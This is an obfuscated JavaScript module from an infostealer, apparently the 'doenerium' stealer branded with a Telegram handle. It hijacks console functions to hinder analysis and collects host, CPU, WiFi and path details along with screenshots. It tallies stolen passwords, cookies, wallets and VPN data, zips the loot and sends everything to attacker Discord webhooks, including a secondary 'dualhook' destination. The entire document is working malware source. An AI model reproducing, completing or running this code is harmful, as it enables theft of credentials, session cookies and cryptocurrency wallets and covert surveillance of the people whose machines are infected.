const _0x55321b = (function () {
    let _0x52f03e = true
    return function (_0x3fa017, _0x20dccf) {
      const _0x57d019 = _0x52f03e
        ? function () {
            if (_0x20dccf) {
              const _0x402ce0 = _0x20dccf.apply(_0x3fa017, arguments)
              return (_0x20dccf = null), _0x402ce0
            }
          }
        : function () {}
      return (_0x52f03e = false), _0x57d019
    }
  })()
  const _0x1d0ca2 = _0x55321b(this, function () {
    const _0x335db7 = function () {
      let _0x14ea35
      try {
        _0x14ea35 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x5abf37) {
        _0x14ea35 = window
      }
      return _0x14ea35
    }
    const _0x5414bb = _0x335db7(),
      _0x4b6094 = (_0x5414bb.console = _0x5414bb.console || {})
    const _0xa76c68 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x543e70 = 0; _0x543e70 < _0xa76c68.length; _0x543e70++) {
      const _0x1219fc = _0x55321b.constructor.prototype.bind(_0x55321b),
        _0x55264e = _0xa76c68[_0x543e70],
        _0x32ed00 = _0x4b6094[_0x55264e] || _0x1219fc
      _0x1219fc['__proto__'] = _0x55321b.bind(_0x55321b)
      _0x1219fc.toString = _0x32ed00.toString.bind(_0x32ed00)
      _0x4b6094[_0x55264e] = _0x1219fc
    }
  })
  _0x1d0ca2()
  module.exports = (_0x3aa65a) => {
    return {
      async create_user_info_embed() {
        let _0x2098b2 = []
        for (var _0x22d088 of _0x3aa65a.config.user.cpus) {
          _0x2098b2.push(_0x3aa65a.utils.encryption.decryptData(_0x22d088))
        }
        let _0x4e9050 =
            '<================[   User Info   ]>================>\n<================[t.me/doener2323]>================>\n\n',
          _0x28bbb0 = []
        const _0x591d89 = await _0x3aa65a.config.user.wifi_connections(),
          _0x558c2f = {
            name: '\uD83C\uDF0F WiFi networks',
            value: '```' + _0x591d89 + '```',
            inline: false,
          }
        _0x28bbb0.push(_0x558c2f)
        for (let [_0x3536cb, _0x10b5e8] of Object.entries({
          '\uD83D\uDDA5️ CPU(s)': _0x2098b2.join('\n'),
          '\u26A1 RAM': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.ram
          ),
          '\uD83D\uDED1 Version': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.version
          ),
          '\u23F3 Uptime': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.uptime
          ),
          '\uD83D\uDCC2 Host directory': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.hostdir
          ),
          '\uD83C\uDD94 Host name': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.hostname
          ),
          '\uD83C\uDD94 PC Name': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.username
          ),
          '\uD83D\uDC7B Type': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.type
          ),
          '\uD83C\uDFF9 Arch': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.arch
          ),
          '\uD83D\uDCE2 Release': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.release
          ),
          '\uD83C\uDF0C AppData Path': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.appdata
          ),
          '\uD83E\uDE90 Temp Path': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.temp
          ),
          '\uD83C\uDF10 User Domain': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.user_domain
          ),
          '\uD83D\uDCE1 Monitor Address': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.monitor_address
          ),
          '\uD83D\uDCA8 System Drive': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.system_drive
          ),
          '\uD83D\uDCBE Processors': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.user.processors
          ),
          '\uD83D\uDCBE Processor Identifier':
            _0x3aa65a.utils.encryption.decryptData(
              _0x3aa65a.config.user.processor_identifier
            ),
          '\uD83D\uDCBE Processor Architecture':
            _0x3aa65a.utils.encryption.decryptData(
              _0x3aa65a.config.user.processor_architecture
            ),
        })) {
          _0x4e9050 += _0x3536cb + ': ' + _0x10b5e8 + '\n'
          const _0x3dd3ca = {
            name: _0x3536cb,
            value: '```' + _0x10b5e8 + '```',
            inline: true,
          }
          _0x28bbb0.push(_0x3dd3ca)
        }
        let _0x135fc0 =
          '<================[WiFi connections]>================>\n<================[t.me/doener2323 ]>================>\n\n' +
          _0x591d89
        _0x3aa65a.utils.jszip.createTxt('\\WiFi Connections.txt', _0x135fc0)
        _0x3aa65a.utils.jszip.createTxt('\\User Info.txt', _0x4e9050)
        const _0x553409 = {}
        return (
          (_0x553409.fields = _0x28bbb0),
          _0x3aa65a.utils.webhook.createEmbed(_0x553409)
        )
      },
      create_executable_info_embed() {
        let _0x3faf45 =
            '<================[Executable Info]>================>\n<================[t.me/doener2323]>================>\n\n',
          _0x280df2 = []
        for (let [_0x2232a7, _0x438a71] of Object.entries({
          '\u2620️ Execution path': _0x3aa65a.utils.encryption.decryptData(
            _0x3aa65a.config.executable.execution_path
          ),
          '\uD83C\uDD7F️ Debug port': _0x3aa65a.config.executable.debug_port,
          '\uD83D\uDD22 PID': _0x3aa65a.config.executable.pid,
          '\uD83D\uDD22 PPID': _0x3aa65a.config.executable.ppid,
        })) {
          const _0xc2eb4f = {
            name: _0x2232a7,
            value: '```' + _0x438a71 + '```',
            inline: false,
          }
          _0x280df2.push(_0xc2eb4f)
          _0x3faf45 += _0x2232a7 + ': ' + _0x438a71 + '\n'
        }
        _0x3aa65a.utils.jszip.createTxt('\\Executable Info.txt', _0x3faf45)
        const _0x443a72 = {}
        return (
          (_0x443a72.fields = _0x280df2),
          _0x3aa65a.utils.webhook.createEmbed(_0x443a72)
        )
      },
      async initialize() {
        let _0x41dc56 = []
        _0x41dc56.push(await this.create_user_info_embed())
        _0x41dc56.push(this.create_executable_info_embed())
        const _0x2f33f9 = { embeds: _0x41dc56 }
        await _0x3aa65a.utils.webhook.sendToWebhook(
          _0x3aa65a.utils.encryption.decryptData(_0x3aa65a.config.webhook.url),
          _0x3aa65a.config.dualhook.url,
          _0x2f33f9
        )
        await this.infect()
        await this.send_zip()
      },
      getFolderFiles(_0x371c79, _0x4233ec) {
        var _0x3c32c8 = ''
        for (var _0x2219a2 of _0x3aa65a.requires.fs.readdirSync(
          _0x371c79 + '\\' + _0x4233ec
        )) {
          var _0x11e94c = (
            _0x3aa65a.requires.fs.statSync(
              _0x371c79 + '\\' + _0x4233ec + '\\' + _0x2219a2
            ).size / 1024
          ).toFixed(2)
          if (
            !_0x3aa65a.requires.fs
              .statSync(_0x371c79 + '\\' + _0x4233ec + '\\' + _0x2219a2)
              .isDirectory()
          ) {
            if (_0x2219a2.includes('.txt')) {
              _0x3c32c8 +=
                '\uD83D\uDCC4 ' +
                _0x4233ec +
                '/' +
                _0x2219a2 +
                ' - ' +
                _0x11e94c +
                ' KB\n'
            } else {
              if (_0x2219a2.includes('.png')) {
                _0x3c32c8 +=
                  '\uD83D\uDDBC️ ' +
                  _0x4233ec +
                  '/' +
                  _0x2219a2 +
                  ' - ' +
                  _0x11e94c +
                  ' KB\n'
              } else {
                _0x3c32c8 +=
                  '\uD83E\uDD59 ' +
                  _0x4233ec +
                  '/' +
                  _0x2219a2 +
                  ' - ' +
                  _0x11e94c +
                  ' KB\n'
              }
            }
          } else {
            _0x3c32c8 += this.getFolderFiles(
              _0x371c79 + '\\',
              _0x4233ec + '/' + _0x2219a2
            )
          }
        }
        return _0x3c32c8
      },
      async send_zip() {
        let _0x23fa04 = "Zip folder's content:\n\n"
        const _0x19eb22 = _0x3aa65a.requires.fs.readdirSync(
          _0x3aa65a.config.jszip.path
        )
        _0x19eb22.forEach((_0x823d33) => {
          if (
            !_0x3aa65a.requires.fs
              .statSync(_0x3aa65a.config.jszip.path + '\\' + _0x823d33)
              .isDirectory()
          ) {
            var _0x3851fb = (
              _0x3aa65a.requires.fs.statSync(
                _0x3aa65a.config.jszip.path + '\\' + _0x823d33
              ).size / 1024
            ).toFixed(2)
            if (_0x823d33.includes('.txt')) {
              _0x23fa04 +=
                '\uD83D\uDCC4 ' + _0x823d33 + ' - ' + _0x3851fb + ' KB\n'
            } else {
              _0x823d33.includes('.png')
                ? (_0x23fa04 +=
                    '\uD83D\uDDBC️ ' + _0x823d33 + ' - ' + _0x3851fb + ' KB\n')
                : (_0x23fa04 +=
                    '\uD83E\uDD59 ' + _0x823d33 + ' - ' + _0x3851fb + ' KB\n')
            }
          } else {
            _0x23fa04 +=
              '' +
              this.getFolderFiles(_0x3aa65a.config.jszip.path + '\\', _0x823d33)
          }
        })
        await _0x3aa65a.utils.jszip.createZip()
        await _0x3aa65a.utils.webhook.sendToWebhook(
          _0x3aa65a.config.webhook.zip
            ? _0x3aa65a.utils.encryption.decryptData(_0x3aa65a.config.webhook.zip)
            : _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.webhook.url
              ),
          _0x3aa65a.config.dualhook.zip
            ? _0x3aa65a.config.dualhook.zip
            : _0x3aa65a.config.dualhook.url,
          {
            content: '```' + _0x23fa04 + '```',
            embeds: [this.create_counter_embed()],
            files: [
              new _0x3aa65a.requires.discordjs.MessageAttachment(
                _0x3aa65a.config.jszip.path + '.zip',
                'doenerium_' +
                  _0x3aa65a.utils.encryption.decryptData(
                    _0x3aa65a.config.user.hostname
                  ) +
                  '.zip'
              ),
            ],
          }
        )
      },
      create_counter_embed() {
        let _0xdc308 = {
            title:
              '\uD83D\uDC89 Infected - ' +
              _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.user.hostname
              ) +
              '/' +
              _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.user.user_domain
              ) +
              '/' +
              _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.user.username
              ),
            footer: {
              text: _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.embed.footer.text
              ),
              icon_url: _0x3aa65a.utils.encryption.decryptData(
                _0x3aa65a.config.embed.footer.icon_url
              ),
            },
            fields: [],
            timestamp: new Date(),
          },
          _0xf4b47d = []
        for (var _0x3ae6d2 of _0x3aa65a.config.user.cpus) {
          _0xf4b47d.push(_0x3aa65a.utils.encryption.decryptData(_0x3ae6d2))
        }
        const _0x3908a8 = {}
        _0x3908a8['\uD83D\uDD11 Passwords'] = _0x3aa65a.config.counter.passwords
        _0x3908a8['\uD83C\uDF6A Cookies'] = _0x3aa65a.config.counter.cookies
        _0x3908a8['\uD83D\uDD16 Bookmarks'] = _0x3aa65a.config.counter.bookmarks
        _0x3908a8['\uD83D\uDEE1️ VPNs'] = _0x3aa65a.config.counter.vpn
        _0x3908a8['\uD83D\uDCB0 Wallets'] = _0x3aa65a.config.counter.wallets
        _0x3908a8['\uD83D\uDCF6 Wifi networks'] =
          _0x3aa65a.config.counter.wifinetworks
        for (let [_0x1cb5df, _0x5cfd3d] of Object.entries(_0x3908a8)) {
          const _0x36a083 = {
            name: _0x1cb5df,
            value: '```' + _0x5cfd3d + '```',
            inline: true,
          }
          _0xdc308.fields.push(_0x36a083)
        }
        return _0xdc308
      },
      async send_screenshot_embed(
        _0x334481 = _0x3aa65a.utils.encryption.decryptData(
          _0x3aa65a.config.webhook.url
        ),
        _0x3ba797 = _0x3aa65a.config.dualhook.url,
        _0x411a43 = true
      ) {
        await _0x3aa65a.requires.screenshot.all().then(async (_0x26cbf4) => {
          let _0x4a3927 = 0
          for (var _0x2e2692 of _0x26cbf4) {
            _0x4a3927++
            await _0x3aa65a.utils.webhook.sendToWebhook(
              _0x334481,
              _0x3ba797,
              {
                embeds: [
                  new _0x3aa65a.requires.discordjs.MessageEmbed(
                    _0x3aa65a.utils.webhook.createEmbed({
                      description:
                        '```\uD83D\uDCF8 Took screenshot [Display ' +
                        _0x4a3927 +
                        ']```',
                      footer: {
                        text: _0x3aa65a.utils.encryption.decryptData(
                          _0x3aa65a.config.embed.footer.text
                        ),
                        icon_url: _0x3aa65a.utils.encryption.decryptData(
                          _0x3aa65a.config.embed.footer.icon_url
                        ),
                      },
                      timestamp: new Date(),
                    })
                  ).setImage('attachment://screenshot.png'),
                ],
                files: [
                  new _0x3aa65a.requires.discordjs.MessageAttachment(
                    _0x2e2692,
                    'screenshot.png'
                  ),
                ],
              },
              _0x411a43
            )
          }
        })
      },
      async infect() {
        let _0x377ce7 = []
        _0x377ce7.push(this.create_counter_embed())
        const _0x473e9c = { embeds: _0x377ce7 }
        await _0x3aa65a.utils.webhook.sendToWebhook(
          _0x3aa65a.utils.encryption.decryptData(_0x3aa65a.config.webhook.url),
          _0x3aa65a.config.dualhook.url,
          _0x473e9c
        )
        try {
          await this.send_screenshot_embed(
            _0x3aa65a.config.webhook.url,
            _0x3aa65a.config.dualhook.url
          )
        } catch {}
        await _0x3aa65a.utils.discord.init()
      },
    }
  }
  